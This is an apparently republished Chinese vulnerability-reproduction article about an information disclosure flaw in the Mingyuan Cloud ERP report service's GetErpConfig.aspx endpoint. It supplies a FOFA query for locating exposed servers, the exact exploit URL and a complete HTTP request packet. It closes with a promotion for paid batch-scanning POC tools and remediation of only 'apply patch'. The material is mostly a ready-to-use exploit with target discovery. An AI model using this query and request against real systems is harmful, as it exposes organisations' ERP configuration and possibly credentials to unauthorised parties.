#  明源云ERP报表服务GetErpConfig.aspx接口存在敏感信息泄露漏洞 附POC   
2024-10-21更新  南风漏洞复现文库   2024-10-21 21:56  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 明源云ERP报表服务简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
明源云ERP报表服务  
## 2.漏洞描述  
  
明源云ERP报表服务GetErpConfig.aspx接口存在敏感信息泄露漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
明源云ERP报表服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3Yib0qc3e4pjEVoCkpIxxEk2hpOEIkhibIEGekLrZ0NAeHicKBJhw1zqdGia6xOvchR1R2yJtz8HqGe1A/640?wx_fmt=png&from=appmsg "null")  
  
明源云ERP报表服务GetErpConfig.aspx接口存在敏感信息泄露漏洞  
## 4.fofa查询语句  
  
body="报表服务已正常运行"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60  
  
漏洞数据包：  
```
GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yib0qc3e4pjEVoCkpIxxEk2ABSczvBwQ4MmnJ7vqn1MLG2JhXJYAdx60AERLvjFicosriaKtmh5NY3Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yib0qc3e4pjEVoCkpIxxEk2WBdCMdgye3aFf0ibcnia4cjZ05ia90iaA6n8G8OvE420kiao8K4T9FWuBPw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yib0qc3e4pjEVoCkpIxxEk2lOQ3IEyq1ECjguLhrzGFkY20aG1NLQkzAgN7YwXaaqI5nPZ3KuGcbg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yib0qc3e4pjEVoCkpIxxEk21UEViasJvkpH7YU9eENfDm0Kbho9Qxf2NUTAAj8toptavBDcMuvJ1ibQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yib0qc3e4pjEVoCkpIxxEk2tYhnb3tIlz3lcfWZniaGXECCbexJeDBnqj1egYkjPP7YtjP5xuVqMVw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yib0qc3e4pjEVoCkpIxxEk2FpU75pT4ib94CAibkUNa4emall71Iib5XKBEwFyFq5MicpXGPUhHACXcWA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[officeWeb365 PW/SaveDraw接口存在任意文件上传漏洞 -老漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487612&idx=1&sn=7eab6f76a8eefdfae301fbce1d4b8484&chksm=974b9d7ba03c146da28d4bad3e7de866b717612911e05fa549cef911510b6dba50d9f157f0ad&scene=21#wechat_redirect)  
  
  
